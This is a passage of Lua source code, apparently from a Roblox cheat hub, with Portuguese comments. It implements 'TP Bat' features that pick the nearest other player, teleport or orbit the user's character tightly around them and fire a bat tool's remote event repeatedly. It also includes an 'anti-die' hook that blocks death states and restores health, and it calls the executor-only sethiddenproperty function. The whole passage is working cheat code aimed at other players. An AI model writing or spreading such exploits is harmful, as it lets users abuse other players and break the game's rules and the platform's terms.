            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function() _G.BlastTpBatV2.hitting = false end)
end

function _G.BlastTpBatV2Tick()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local closest, best = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local tr = player.Character:FindFirstChild("HumanoidRootPart")
            local hum = player.Character:FindFirstChildOfClass("Humanoid")
            if tr and hum and hum.Health > 0 then
                local d = (root.Position - tr.Position).Magnitude
                if d < best then best = d; closest = player end
            end
        end
    end
    if not (closest and closest.Character) then return end
    local tr = closest.Character:FindFirstChild("HumanoidRootPart")
    if not tr then return end
    if sethiddenproperty then
        pcall(function() sethiddenproperty(root, "PhysicsRepRootPart", tr) end)
    end
    local targetPos = tr.Position - tr.CFrame.LookVector * 2.4 + Vector3.new(0, 1.5, 0)
    local voidY = -500
    pcall(function() voidY = (workspace.FallenPartsDestroyHeight or -500) + 80 end)
    local unsafe = (targetPos.Y <= voidY) or (tr.AssemblyLinearVelocity.Y < -120)
    if not unsafe then
        -- posicao colada no alvo + inclinacao leve estavel durante todo o TP Bat
        root.CFrame = _G._BlastTpBatLeanCFrame(targetPos, tr)
    end
    local cam = workspace.CurrentCamera
    if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
    _G.BlastTpBatV2Swing()
end


-- ============================================================
-- SNOW TP BAT (hub + mobile) — logic only, no standalone UI
-- ============================================================
State.snowTpBatEnabled = State.snowTpBatEnabled == true
local _snowTp = {
    conn = nil,
    hitCooldown = false,
    antiDieConns = {},
    target = nil,
    orbitAngle = 0,
    previousAutoRotate = nil,
}

local SNOW_ORBIT_RADIUS = 3.0
local SNOW_ORBIT_HEIGHT = 2.75
local SNOW_ORBIT_SPEED = math.rad(420)
local SNOW_ORBIT_LEAN = math.rad(-75)

local function _snowDisconnectAntiDie()
    for _, c in ipairs(_snowTp.antiDieConns) do pcall(function() c:Disconnect() end) end
    _snowTp.antiDieConns = {}
end

local function _snowHookAntiDie(character)
    _snowDisconnectAntiDie()
    if not State.snowTpBatEnabled or not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    pcall(function()
        humanoid.BreakJointsOnDeath = false
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dying, false)
    end)
    table.insert(_snowTp.antiDieConns, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
        if State.snowTpBatEnabled and humanoid.Parent and humanoid.Health <= 0 then
            pcall(function()
                humanoid.Health = humanoid.MaxHealth
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end)
        end
    end))
end

local function _snowFindBat()
    local character = LP.Character
    if not character then return nil end
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA("Tool") then
            local n = child.Name:lower()
            if n:find("bat") or n:find("slap") then return child end
        end
    end
    local backpack = LP:FindFirstChildOfClass("Backpack")
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") then
                local n = child.Name:lower()
                if n:find("bat") or n:find("slap") then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then pcall(function() humanoid:EquipTool(child) end) end
                    return child
                end
            end
        end
    end
    return nil
end

local function _snowNearest(root)
    if not root then return nil, math.huge end
    local best, bestD = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local otherRoot = player.Character:FindFirstChild("HumanoidRootPart")
            local otherHum = player.Character:FindFirstChildOfClass("Humanoid")
            if otherRoot and otherHum and otherHum.Health > 0 then
                local d = (root.Position - otherRoot.Position).Magnitude
                if d < bestD then bestD = d; best = player end
            end
        end
    end
    return best, bestD
end

local function _snowSwing()
    if _snowTp.hitCooldown then return end
    _snowTp.hitCooldown = true
    pcall(function()
        local bat = _snowFindBat()
        if not bat then return end
        bat:Activate()
        local remote = bat:FindFirstChildWhichIsA("RemoteEvent")
        if remote then remote:FireServer() end
    end)
    task.delay(0.08, function() _snowTp.hitCooldown = false end)
end

local function _snowTick(deltaTime)
    if not State.snowTpBatEnabled then return end
    local character = LP.Character
    if not character then return end
    local root = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end

    local target = _snowTp.target
    local targetChar = target and target.Character
    local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
    local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    if not (target and target.Parent == Players and targetRoot and targetHum and targetHum.Health > 0) then
        _snowTp.target = nil
        local nearest, distance = _snowNearest(root)
        if not nearest or distance > 100 then return end

        target = nearest
        _snowTp.target = target
        targetChar = target.Character
        targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        if not targetRoot then
            _snowTp.target = nil
            return
        end

        local relative = root.Position - targetRoot.Position
        if Vector3.new(relative.X, 0, relative.Z).Magnitude > 0.01 then
            _snowTp.orbitAngle = math.atan2(relative.Z, relative.X)
        else
            _snowTp.orbitAngle = 0
        end
    end
    if not targetRoot or not targetRoot.Parent then return end

    local bat = _snowFindBat()
    if bat and bat.Parent ~= character then pcall(function() humanoid:EquipTool(bat) end) end

    local dt = math.min(math.max(tonumber(deltaTime) or 0, 0), 0.05)
    _snowTp.orbitAngle = (_snowTp.orbitAngle + SNOW_ORBIT_SPEED * dt) % (math.pi * 2)

    local cosAngle = math.cos(_snowTp.orbitAngle)
    local sinAngle = math.sin(_snowTp.orbitAngle)
    local orbitOffset = Vector3.new(cosAngle * SNOW_ORBIT_RADIUS, SNOW_ORBIT_HEIGHT, sinAngle * SNOW_ORBIT_RADIUS)
    local orbitPos = targetRoot.Position + orbitOffset
    local tangent = Vector3.new(-sinAngle, 0, cosAngle)

    local voidY = -500
    pcall(function() voidY = (workspace.FallenPartsDestroyHeight or -500) + 80 end)
    if orbitPos.Y <= voidY or targetRoot.AssemblyLinearVelocity.Y < -120 then return end

    if _snowTp.previousAutoRotate == nil then _snowTp.previousAutoRotate = humanoid.AutoRotate end
    humanoid.AutoRotate = false
    root.AssemblyLinearVelocity = Vector3.zero
    root.AssemblyAngularVelocity = Vector3.zero
    root.CFrame = CFrame.lookAt(orbitPos, orbitPos + tangent, Vector3.yAxis)
        * CFrame.Angles(SNOW_ORBIT_LEAN, 0, 0)
    _snowSwing()
end

local _snowSetBusy = false
function _G.BlastSnowTpSet(on)
    if _snowSetBusy then return end
    _snowSetBusy = true
    State.snowTpBatEnabled = on == true
    _snowTp.target = nil
    _snowTp.orbitAngle = 0
    if State.snowTpBatEnabled then
        local character = LP.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        _snowTp.previousAutoRotate = humanoid and humanoid.AutoRotate or true
        _snowHookAntiDie(LP.Character)
        if _snowTp.conn then pcall(function() _snowTp.conn:Disconnect() end); _snowTp.conn = nil end
        _snowTp.conn = RunService.Heartbeat:Connect(_snowTick)
    else
        if _snowTp.conn then pcall(function() _snowTp.conn:Disconnect() end); _snowTp.conn = nil end
        _snowDisconnectAntiDie()
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.AutoRotate = _snowTp.previousAutoRotate ~= false end
        _snowTp.previousAutoRotate = nil
        if root then pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end) end
    end
    if mobileButtons and mobileButtons.tpBat and mobileButtons.tpBat.setActive then
        pcall(function() mobileButtons.tpBat.setActive(State.snowTpBatEnabled) end)
    end
    if toggleRefs and toggleRefs.snowTpBat then
        pcall(function() toggleRefs.snowTpBat(State.snowTpBatEnabled, true) end)
    end
    _snowSetBusy = false
end

pcall(function()
    trackConn(LP.CharacterAdded:Connect(function(character)
        if State.snowTpBatEnabled then
            task.wait(0.1)
            _snowHookAntiDie(character)
        end
    end))
end)

-- Vision Bat / TP Bat removed from hub
-- ============================================================
-- USER PROVIDED BILLBOARD & TAG SYSTEM
-- ============================================================
-- Disabled to prevent "out of local registers" error